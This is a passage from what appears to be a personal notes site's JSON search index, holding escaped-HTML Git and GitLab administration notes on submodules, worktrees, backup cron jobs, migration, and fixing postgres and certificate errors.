style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config --remove-section submodule.\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -f .gitmodules\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecommit hash\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-parse HEAD\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecommit tag\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit describe --tags\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eworktree\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit worktree list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# add\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit worktree add ../dirname branch-name\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit config\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[user]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eemail\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezeyanlin@outlook.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  name = Ricky\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  signingkey = 2A4313489FDCA802ED6FCC214B03D879EA73DF37\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[commit]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003egpgsign\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit config1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003eFor golang import package\u003c/p\u003e","tags":null,"title":"Git Command"},{"categories":null,"contents":" cleanup doc\n# artifacts gitlab-rake gitlab:cleanup:orphan_job_artifact_files # expire session gitlab-rake gitlab:cleanup:sessions:active_sessions_lookup_keys # lfs gitlab-rake gitlab:cleanup:orphan_lfs_files # project gitlab-rake gitlab:cleanup:project_uploads gitlab-rake gitlab:cleanup:remote_upload_files # registry gitlab-ctl registry-garbage-collect gitlab-ctl registry-garbage-collect -m migration 1. Copy Old Crontab、Old /etc/gitlab、update-ca-trust 2. Version should be same 3. Copy newest backup file 4. Stop Services gitlab-ctl stop unicorn gitlab-ctl stop puma gitlab-ctl stop sidekiq gitlab-ctl status 5. Restore File must put in /var/opt/gitlab/backup\nchown git:git backupfile gitlab-backup restore BACKUP=11493107454_2018_04_25_10.6.4-ce 6. Check gitlab-ctl reconfigure gitlab-ctl restart gitlab-rake gitlab:check SANITIZE=true 7. Unlock gitlab-runner at Admin Area 8. Pages: Add https settings in gitlab.rb, Admin Area -\u0026gt; Applications -\u0026gt; Destroy old System OAuth, and remove secret in gitlab-secret.json. gitlab-ctl reconfigure ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/gitlab/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecleanup\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ca href=\"https://docs.gitlab.com/ee/administration/packages/container_registry.html\" target=\"_blank\" rel=\"noopener\"\u003edoc\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# artifacts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:orphan_job_artifact_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# expire session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:sessions:active_sessions_lookup_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# lfs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:orphan_lfs_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# project\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:project_uploads\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:remote_upload_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl registry-garbage-collect\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl registry-garbage-collect -m\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emigration\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"1-copy-old-crontabold-etcgitlabupdate-ca-trust\"\u003e1. Copy Old Crontab、Old /etc/gitlab、update-ca-trust\u003c/h6\u003e\n\u003ch6 id=\"2-version-should-be-same\"\u003e2. Version should be same\u003c/h6\u003e\n\u003ch6 id=\"3-copy-newest-backup-file\"\u003e3. Copy newest backup file\u003c/h6\u003e\n\u003ch6 id=\"4-stop-services\"\u003e4. Stop Services\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop unicorn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop puma\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop sidekiq\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl status\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"5-restore\"\u003e5. Restore\u003c/h6\u003e\n\u003cblockquote\u003e\n\u003cp\u003eFile must put in /var/opt/gitlab/backup\u003c/p\u003e","tags":null,"title":"Gitlab Command"},{"categories":null,"contents":" add member by project Admin Area -\u0026gt; Settings -\u0026gt; General -\u0026gt; LDAP settings -\u0026gt; Lock memberships to LDAP synchronization -\u0026gt; Cancel backup cronjob # Backup Gitlab configs 1 0 * * * /usr/bin/tar -zcf /var/opt/gitlab/backups/`date +%Y_%m_%d`_gitlab_config.tar.gz /etc/gitlab \u0026amp;\u0026gt; /tmp/backup.log # Backup Gitlab data 1 1 * * * /usr/bin/gitlab-backup create STRATEGY=copy BACKUP=`date +%Y_%m_%d` \u0026amp;\u0026gt;\u0026gt; /tmp/backup.log # Rotate 0 2 * * * /usr/bin/rm -f `find /data/backups/ -name \u0026#34;*.tar*\u0026#34; -mtime +15` gitlab-ci.yml template gitbook gitlab-ci.yml gitbook.yml golang gitlab-ci.yml hexo gitlab-ci.yml Static resources gitlab-ci.yml template gitlab-ci.yml config gitlab-runner gitlab-runner.toml issue console output while install [execute] psql: could not connect to server: Connection refused Is the server running locally and accepting connections on Unix domain socket \u0026#34;/var/opt/gitlab/postgresql/.s.PGSQL.5432\u0026#34;? solve # stop service sudo gitlab-ctl stop sudo systemctl stop gitlab-runsvdir.service # check if there are any postgres processes; shouldn\u0026#39;t be ps aux | grep postgre # remove process pid sudo rm /var/opt/gitlab/postgresql/data/postmaster.pid # start service sudo systemctl start gitlab-runsvdir.service sudo gitlab-ctl reconfigure issue1 解決 Gitlab Pages 限制訪問權限後的 redirect invalid url。 Remove \u0026ldquo;gitlab_pages\u0026rdquo; block from /etc/gitlab/gitlab-secrets.json gitlab-ctl reconfigure issue2 console output # Gitlab Container Registry Error response from daemon: Get https://registry.knowhow.fun/v2/: x509: certificate has expired or is not yet valid /etc/gitlab/gitlab.rb solve yum install ca-certificates cd /etc/gitlab openssl genrsa -out ca.key 4096 openssl req -new -x509 -days 3650 -key ca.key -out ca.crt openssl genrsa -out server.key 4096 openssl req -new -key server.key -out server.csr openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt cp server.crt /etc/pki/ca-trust/source/anchors/ cp ca.crt /etc/pki/ca-trust/source/anchors/ update-ca-trust issue3 console output # Gitlab Container Registry received unexpected HTTP status: 500 Internal Server Error solve /etc/gitlab/gitlab.rb\ngitlab_rails[\u0026#39;ldap_servers\u0026#39;] = { \u0026#39;main\u0026#39; =\u0026gt; { \u0026#39;encryption\u0026#39; =\u0026gt; \u0026#39;plain\u0026#39;, } } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/gitlab/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eadd member by project\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003eAdmin Area -\u0026gt; Settings -\u0026gt; General -\u0026gt; LDAP settings -\u0026gt; Lock memberships to LDAP synchronization -\u0026gt; Cancel\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ebackup cronjob\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Backup Gitlab configs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e * * * /usr/bin/tar -zcf /var/opt/gitlab/backups/\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edate +%Y_%m_%d\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e_gitlab_config.tar.gz /etc/gitlab \u0026amp;\u0026gt; /tmp/backup.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Backup Gitlab data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e * * * /usr/bin/gitlab-backup create STRATEGY\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecopy BACKUP\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edate +%Y_%m_%d\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e \u0026amp;\u0026gt;\u0026gt; /tmp/backup.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Rotate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e * * * /usr/bin/rm -f \u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003efind /data/backups/ -name \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*.tar*\u0026#34;\u003c/span\u003e -mtime +15\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egitlab-ci.yml template\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"gitbook\"\u003egitbook\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/gitbook/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/gitbook/.gitbook.yml\"\u003egitbook.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"golang\"\u003egolang\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/golang/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"hexo\"\u003ehexo\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/hexo/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"static-resources\"\u003eStatic resources\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/static/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"template\"\u003etemplate\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/template/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econfig\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"gitlab-runner\"\u003egitlab-runner\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/config/gitlab-runner/gitlab-runner.toml\"\u003egitlab-runner.toml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output-while-install\"\u003econsole output while install\u003c/h6\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[execute] psql: could not connect to server: Connection refused\n            Is the server running locally and accepting\n            connections on Unix domain socket \u0026#34;/var/opt/gitlab/postgresql/.s.PGSQL.5432\u0026#34;?\n\u003c/code\u003e\u003c/pre\u003e\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# stop service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo gitlab-ctl stop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl stop gitlab-runsvdir.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# check if there are any postgres processes; shouldn\u0026#39;t be\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eps aux | grep postgre\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# remove process pid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo rm /var/opt/gitlab/postgresql/data/postmaster.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# start service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl start gitlab-runsvdir.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo gitlab-ctl reconfigure\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"解決-gitlab-pages-限制訪問權限後的-redirect-invalid-url\"\u003e解決 Gitlab Pages 限制訪問權限後的 redirect invalid url。\u003c/h6\u003e\n\u003col\u003e\n\u003cli\u003eRemove \u0026ldquo;gitlab_pages\u0026rdquo; block from \u003ccode\u003e/etc/gitlab/gitlab-secrets.json\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egitlab-ctl reconfigure\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output\"\u003econsole output\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Gitlab Container Registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eError response from daemon: Get https://registry.knowhow.fun/v2/: x509: certificate has expired or is not yet valid\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"etcgitlabgitlabrb\"\u003e\u003ca href=\"/notes/docs/gitlab/config/gitlab/gitlab.rb\"\u003e/etc/gitlab/gitlab.rb\u003c/a\u003e\u003c/h6\u003e\n\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install ca-certificates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /etc/gitlab\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out ca.key \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -x509 -days \u003cspan style=\"color:#ae81ff\"\u003e3650\u003c/span\u003e -key ca.key -out ca.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out server.key \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -key server.key -out server.csr\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -req -days \u003cspan style=\"color:#ae81ff\"\u003e3650\u003c/span\u003e -in server.csr -CA ca.crt -CAkey ca.key -set_serial \u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e -out server.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp server.crt /etc/pki/ca-trust/source/anchors/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp ca.crt /etc/pki/ca-trust/source/anchors/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eupdate-ca-trust\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output\"\u003econsole output\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Gitlab Container Registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ereceived unexpected HTTP status: \u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e Internal Server 